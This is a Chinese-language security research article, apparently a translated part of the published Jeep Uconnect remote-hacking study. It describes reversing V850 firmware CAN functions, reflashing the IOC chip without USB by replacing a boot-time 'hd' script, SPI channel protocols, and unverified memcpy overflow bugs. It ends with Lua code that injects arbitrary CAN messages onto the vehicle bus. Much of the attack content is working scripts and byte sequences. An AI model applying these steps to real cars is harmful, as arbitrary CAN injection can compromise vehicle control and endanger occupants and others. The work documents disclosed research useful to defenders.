2&amp;3</p><p>现在，IDB已经具有了RAM中变量的交叉引用，一个填充了CAN控制寄存器和信息缓冲区的PPA部分，还有一个完全正常化的ROM代码部分。目前，我们估计已经能看见PPA部分上，CAN信息缓冲区的外部引用，但是，我们很困惑，在代码节上，我们为什么观察不到任何到PPA的引用呢？</p><p>注意：要想发现错误，我们需要做很多，需要我们在ROM区段中以代码的形式列出了一些数据，但是无论如何，我们还是会继续。</p><p>既然我们无法找到任何可行的外部引用会引用相关的CAN代码，我们决定下载IAR工作台，有很多自动化领域的工程师都会使用这个平台来给V850处理器编译代码。IAR工作台中恰好提供了我们的处理器所使用的代码示例，并且还包含了用于发送和接收CAN信息的代码样本。</p><p><img alt="" img-src="llcyepme1zn_6qmazl4edg?s=2sdkadyvrlzm"></p><p>图-IAR中的V850 CAN 代码示例</p><p>然后，我们就可以完整的逆向‘can&#95;transmit&#95;msg’这个函数。我们本应该知道，代码并不会直接访问PPA，而是访问ROM中的变量，这个ROM指向的就是相关的CAN部分。只要你获取到了CAN模块阵列，并根据索引来访问这些模块，一切就都说得通了，请参考上面的IAR示例。我们现在已经有了函数的引用点，这些函数能够与CAN总线交互。</p><p><img alt="" img-src="qq-fymftvemhm5wlx6m9wa?s=2sdkadyvrlzm"></p><p>图-PPA CAN变量</p><p>除了ROM中与CAN通讯相关的变量，在RAM中还引用了CAN使用的信息缓冲区和控制寄存器。基本上，PPA中的数据都会复制到RAM，反之亦然，因为这些值可以在短时间内被覆盖。例如，我们逆向了函数‘can&#95;read&#95;from&#95;ram’ 和d ‘can&#95;write&#95;to&#95;ram’，这两个函数的作用分别就是把PPA中的数据放到RAM，读取RAM中的数据放到PPA。</p><p><img alt="" img-src="etdw1dqu1vgmboly43r9ba?s=2sdkadyvrlzm"></p><p>图-can&#95;read&#95;from_ram</p><p><img alt="" img-src="hxmhokrb78mqrqry-upy6g?s=2sdkadyvrlzm"></p><p>图-can&#95;write&#95;to_ram</p><p>在RAM中还有另外几个非常重要的区域储存着CAN ID，CAN数据长度和CAN信息数据。在RAM中储存着一些变量指针，这是发送CAN信息所不可缺少的。</p><p><img alt="" img-src="xnf1zra__fw-m9xrvpexaa?s=2sdkadyvrlzm"></p><p>图-RAM指针</p><p>通过跟踪CAN寄存器，信息缓冲区和RAM值，我们完整的逆向了好几个用于发送和接收CAN信息的函数。对我们来说，最有用的一个函数是’can&#95;transmit&#95;msg&#95;1&#95;or_3’，这个函数会从固定CAN ID阵列中提取一个索引，在我们的例子中，获取的是一个特殊的索引，指示我们正在提供一个用户提供的CAN ID；还有一个指向了数据长度和CAN信息数据的指针。通过向RAM中的几个位置填充值，我们可以让固件发送任意的CAN信息、控制ID、长度和数据。</p><p><img alt="" img-src="5fh_gre1xncmtslsmhcqda?s=2sdkadyvrlzm"></p><p>图-can&#95;transmit&#95;msg&#95;1&#95;or_3</p><p>目前来说，我们的最大问题是，虽然我们有能力制作任何CAN信息，但是我们实际上没有调用函数的方法。我们可以通过修改固件来调用函数，但是我们想要找到一种方法来从OMAP芯片上发送CAN信息，使用V850作为一个代理。似乎我们有些本末倒置了，因为对于传输函数的直接调用是有限制的，没有任何函数能调用到OMAP芯片上。本质上说，Uconnect系统确实执行了一些CAN功能，但是我们无法通过入侵头单元来直接调用任何的函数，所以，我们需要另一种方式让我们的信息传递到总线上。</p><p>我们知道V850/Fx3也支持通过SPI和I2C的串行通讯，但是我们只看到过头单元与V850芯片之间使用过SPI通讯。所以，我们决定在固件中查找可以执行SPI数据解析的代码。SPI是一个非常简单的串行通讯协议，所以我们决定查找在线路上观察到的特定值，以及类似于逐字节数据解析的代码。</p><p><img alt="" img-src="tchbbs0ccp6iv3m-ao8kcg?s=2sdkadyvrlzm"></p><p>图-SPI通道7</p><p>在上面的例子中，你可以看到，0x22的值被用于比较0x4A1E6上的值，这与我们在SPI 通道7上面观察到的数据吻合。接下来，在下一章，我们会使用SPI协议和修改过的IOC固件，向V850芯片发送任意数据，填充变量并发送任意的CAN信息。</p><p>注意：为了保持简洁，在这一章中我们省略了大量的细节。和往常一样，有具体问题请联系我们的邮箱。我们用了几周的时间才完成了V850固件和SPI通讯的逆向，结果表明这一部分是整个项目中最耗时耗力的。</p><h2>不用USB刷V850</h2><p>IOC运行在V850芯片上，能够直接访问（读/写）CAN总线，所以，我们的目标就是修改IOC并想办法从Uconnect系统上与IOC通讯。如前文所述，这个固件没有签名，并且可以从头单元上更新。对于攻击者来说，最复杂的部分就是系统只能使用U盘来更新，作为一名远程攻击者，我们无法做到这一点。我们希望能在不使用USB设备的情况下，从OMAP芯片上刷V850。</p><p>前面的章节中，我们详细的介绍过，IOC的更新是‘iocupdate’二进制通过与SPI通道4通讯，使用类似ISO-14230的命令执行的。当在应用模式下时，也就是头单元“启动”状态下，‘iocupdate’二进制不会处理V850。在常规模式下，所有发送到V850的SPI信息都会被忽略。需要让IOC进入 “bootrom”模式，才能更新固件。</p><p>但是，让V850进入 “bootrom”的唯一办法是重置V850，然后重置OMAP芯片（这样攻击者就会丢失控制）。当OMAP处理器启动进入 “更新模式”时（要想让IOC进入 “bootrom”模式，OMAP需要进入 “更新模式”），OMAP处理器会尝试从USB设备更新。这种更新方式一般是硬编码的，无法更改。</p><p>我们的主要目的是让V850进入 “更新模式”，当然，是在没有USB设备参与的情况下。在这里，我们可以远程在文件系统中放入一个镜像，通过镜像来更新V850。很显然，我们无法依靠USB设备来发动远程攻击。</p><p>第一步是运行代码来重启v850进入引导程序模式，让OMAP进入更新模式。下面是使用的LUA代码：</p><pre><code>onoff = require "onoff" 
+onoff.setUpdateMode(true) 
+onoff.setExpectedIOCBootMode("bolo") 
+onoff.reset( "bolo")
+</code></pre><p>下面的代码会让V850恢复成应用模式，让OMAP恢复到常规模式：</p><pre><code>onoff = require "onoff" 
+onoff.setExpectedIOCBootMode( "app") 
+onoff.setUpdateMode(false) 
+onoff.reset( "app")
+</code></pre><p>下一步是尝试控制V850在bootrom模式中运行的代码。以及OMAP处理器在更新模式中运行的代码，从而让我们绕过USB设备检查。还记得，当OMAP处理启动备份时，我们无法与其通讯（远程接口无法启用）。我们可以通过检查更新模式中的机器是如何启动的，从而在更新模式中运行代码。文件’bootmode.sh’是首先执行的一个文件。</p><p>不幸运的是，我们无法修改’bootmode.sh’，因为这个文件位于一个不可写目录，下面是文件的一部分。</p><pre><code>#!bash
+#!/bin/sh
+ #
+ # Determine the boot mode from the third byte
+ # of the "swdl" section of the FRAM.  A "U"
+ # indicates that we are in Update mode.  Anything
+ # else indicates otherwise.
+ #
+ inject -e -i /dev/mmap/swdl -f /tmp/bootmode -o 2 -s 1
+BOOTMODE=`cat /tmp/bootmode`
+echo "Bootmode flag is $BOOTMODE"
+rm -f /tmp/bootmode
+if [ "$BOOTMODE" != "U" ]; then
+exit 0 fi
+echo "Software Update Mode Detected"
+waitfor /fs/mmc0/app/bin/hd 2
+if [ -x /fs/mmc0/app/bin/hd ]; then
+   echo "swdl contents"
+   hd -v -n8 /fs/fram/swdl
+   echo "system contents"
+   hd -v -n16 /fs/fram/system
+else
+   echo "hd util not detected on MMC0"
+fi
+</code></pre><p>fi</p><p>你可以看到，如果OMAP芯片没有在更新模式中，剩下的所有文件都不会执行。如果OMAP芯片在更新模式中，OMAP就会继续进行并执行 ‘hd’程序。这个应用位于/fs/mmc0分区，可以修改成可写的，所以我们就修改了这个分区。因此，为了能在OAMP芯片进入更新模式，让v850进入引导程序模式执行代码，我们只需要用我们选择的代码来替换‘/fs/mmc0/app/bin/hd’。因为两个处理器都在适合的模式下，无论我们在’hd’中放什么，都能够更新V850的固件。</p><p>下面是我们修改后的’hd’：</p><pre><code>#!bash
+#!/bin/sh
+# update ioc
+/fs/mmc0/charlie/iocupdate -c 4 -p /fs/mmc0/charlie/cmcioc.bin
+# restart in app mode
+lua /fs/mmc0/charlie/reset_appmode.lua
+# sleep while we wait for the reset to happen
+/bin/sleep 60
+</code></pre><p>剩下要做的就是让‘/fs/mmc0’ 分区可写，在合适的位置放入合适的文件，然后重启进入引导程序模式。这些cao'zu都是在文件‘omap.sh’ 中完成的。</p><p>此次更新总共需要大约25秒，包括了在应用模式中启动备份所需要的时间。在应用模式中启动备份后，新的V850固件就会运行。</p><h2>SPI通讯</h2><p>OMAP芯片会使用一个串行外围接口，实现一个适合的协议，与V850芯片通讯。这个通讯包括了刷新V850芯片，执行DTC操作和发送CAN信息。实际上，这个通讯是在一个高级别上，通过各种服务实现的。在低级别上，可以通过读取和写入‘/dev/spi3’来实现直接通讯。</p><p>不过，似乎没有命令能让OMAP芯片来要求V850将数据字节发送给任意CAN ID。但是，V850内置了一系列的命令ID，多数硬编码数据都可以由OMAP芯片发送。作为一名攻击者，我们想要的远不止这些。</p><h2>SPI信息协议</h2><p>我们没有完整逆向从OMAP芯片发送到SPI芯片的整个信息协议，但是我们在这列出了一些突出点。</p><p>当V850处于更新模式时，通讯和ISO 14230命令类似。如果你在逆向‘iocupdate’二进制细心一点，你就会注意到这一点。下面是发送的一些字节示例：</p><pre><code>startDiagnosticSession: 10 85
+ecuReset: 11 01
+requestTransferExit: 37
+requestDownload: 34 00 00 00 00 07 00 00
+readEcuIdentification: 1A 87
+</code></pre><p>当v850处于常规模式下时，通讯似乎是复合式的。其中的一些通讯字节指示了信息的长度。信息中的第一个字节实际指示的是 “通道”，其他的字节是数据。在稍微更高的级别中，每个通道都可以通过‘<code>/dev/ipc/ch7</code>’ 访问。</p><p>我们并不了解所有的通道，以及这些通道各自的用处。但是其中有一些突出的：</p><pre><code>通道 6: ctrlChan, 用于发送预先编好的CAN信息 
+通道 7: 与DTC和诊断相关
+通道 9: 从V850中获取时间
+通道 25: 某种秘钥
+</code></pre><h2>获取V850的版本信息</h2><p>如果你观察‘platform_version.lua’ ，你就会知道如何才能获取到V850上运行的固件版本。如果你通过通道7发送两个特殊的字节，V850就会响应版本信息。</p><pre><code>ipc_ch7:write(0xf0, 3)
+...
+...
+local function onIpcMessage(msg)
+   if msg[1] ~= 240 then
+return end
+if msg[2] == 3 then
+versions.ioc_app_version = msg[3] .. "." .. msg[4] .. "." .. msg[5] ipc_ch7:close()
+end end
+</code></pre><p>所以，如果你发送‘F0 03’，预计会返回5个字节，f0, 03, x, y, z；其中版本信息就是x.y.z。你可以通过OMAP芯片上的D-Bus服务来查询版本信息，从而验证这种方法是不是准确的。</p><pre><code>service = require "service" x=service.invoke("com.harman.service.platform", "get_all_versions", {}) print(x, 1)
+  app_version: 14.05.3
+  ioc_app_version: 14.2.0
+  hmi_version: unknown
+  eq_version: 14.05.3
+  ioc_boot_version: 13.1.0
+  nav_version: 13.43.7
+</code></pre><h2>V850的编译日期</h2><p>这里的这个简单的程序就可以获取V850芯片的编译日期：</p><pre><code>file = '/dev/ipc/ch7'
+g = assert(ipc.open(file))
+f = assert(io.open(file, "r+b"))
+g:write(0xf0, 0x02)
+bytes = f:read(0x18)
+print(hex_dump(bytes))
+g:close()
+f:close()
+</code></pre><p>下面是上述脚本的输出。编译日期是Jan 09 2014, 20:46（2014年1月9日，20:46）：</p><pre><code># lua spi.lua
+0000: 00 f0 02 42 3a 46 2f 4a ...B:F/J 
+0008: 61 6e 20 30 39 20 32 30 an 09 20 
+0010: 31 34 2f 32 30 3a 34 36 14/20:46
+</code></pre><h2>固件中的V850漏洞</h2><p>我们已经演示了如何将篡改后的固件刷入到V850中。但是，如果它们使用了加密签名怎么办，或者你想要在不重新编程的前提下，动态地影响V850，从而不留下分析证据？我们简单地浏览一下负责解析V850固件中SPI信息的代码，并确定了一下潜在的漏洞。因为我们不需要这些漏洞，而且也没有V850调试工具，所以我们没有验证这些漏洞，但是这些漏洞似乎是内存崩溃问题。</p><p>虽然通过SPI接口来实现攻击的机会并不大，但是由于通讯的受信特性，所以，代码也不都是很安全。在v850应用固件中，SPI处理代码就存在下面的两个bug。</p><pre><code>0004A212      ld.w    -0x7BD8[gp], r16 -- 3ff7534
+0004A216      ld.w    6[r16], r17
+0004A21A      mov     r17, r6
+0004A21C      addi    5, r28, r7
+0004A220      ld.bu   4[r28], r18
+0004A224      mov     r18, r8
+0004A226      jarl    memcpy, lp
+</code></pre><p>在这个代码中，r28指向了通过SPI发送的用户控制数据。这段代码的反编译结果如下：</p><pre><code>memcpy(fixed_buffer, attacker_controlled_data, attacker_controlled_len);
+</code></pre><p>是一个类似的栈溢出：</p><pre><code>0004A478      movea   arg_50, sp, r6
+0004A47C      addi    5, r28, r7
+0004A480      ld.bu   4[r28], r10
+0004A484      mov     r10, r8
+0004A486      jarl    memcpy, lp
+</code></pre><p>我们已经在代码库中找到了另外的几个内存崩溃bug，但是没有列在这儿，因为我们的利用过程不需要。</p><h2>通过V850芯片发送CAN信息</h2><p>如果你按照我们上述的介绍来修改固件，那么通过修改你就可以从OMAP芯片中发出任意的CAN信息。实现的方式有很多种，但是最简单也最安全的方式是在SPI信息中发送CAN数据，这样信息就会传递给V850中合适的函数。我们选择了SPI通道7上的信息‘F0 02’。和前面的观察一样，这个信息对应的是获取固件的编译日期。我们选用这条命令，是因为我们没有发现任何代码会调用这条命令，所以即便我们搞砸了，也不会造成致命的错误。</p><p>处理通道7的函数位于0x4b2c6。处理‘F0 02’的代码从0x4aea4 开始。我们的技术是通过修改固件并跳转到ROM中一个没有使用过的位置，在这里放置上我们选择的任意代码。在代码结束时，我们就把执行返回到初始的位置。</p><p><img alt="" img-src="kb9kbeek72bvosb49kypjq?s=2sdkadyvrlzm"></p><p>图-我们在固件中新添加的代码</p><p>我们使用的函数是‘can&#95;transmit&#95;msg&#95;1&#95;or_3’ (0x6729c)。这个函数会从92个固定值中选取一个作为参数，这个92个值各自对应了CAN信息阵列中(ID，长度和数据)的一个独立位置。对于大多数值而言，CAN ID是固定的。但是对于某些值来说（39和91为例），它们会从RAM中（不同其他从ROM中读取）读取CAN ID和LEN。</p><p>我们的代码会从SPI信息中读取CAN ID，并把CAN ID放到RAM中，从而读取CAN ID的位置（gp- 0x2CC4 ）。然后把SPI数据包中的数据复制到RAM中的合适位置。最后，复制数据长度，并把数据长度放到预期位置。我们的代码会调用函数来传输这个信息，然后把一个值设置成r18（由我们的框架代码破坏），并按预期返回。</p><p>接着，从头单元中，类似下面的LUA代码会向高速总线和中速总线发送一个CAN信息，分别取决于你使用的是39信息还是91信息。</p><pre><code>ipc = require("ipc")
+file = '/dev/ipc/ch7'
+g = assert(ipc.open(file))
+-- f0,02,39|91,LEN,CAN1,CAN2,CAN3,CAN4,DATA0,DATA1...
+g:write(0xf0, 0x02, 91, 0x08, 0xf1, 0x86, 0xda, 0xf8, 0x05, 0x2F, 0x51, 0x06, 0x03, 0x10, 0x00, 0x00)
+</code></pre><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/9974" rel="bookmark" id="re1">远程入侵原装乘用车（上）</a></li><li><a href="http://drops.wooyun.org/papers/9976" rel="bookmark" id="re2">远程入侵原装乘用车（下）</a></li><li><a href="http://drops.wooyun.org/papers/3030" rel="bookmark" id="re3">一只android短信控制马的简单分析</a></li><li><a href="http://drops.wooyun.org/papers/12645" rel="bookmark" id="re4">中间人攻击 -- Cookie喷发</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"></div></div></div></main>
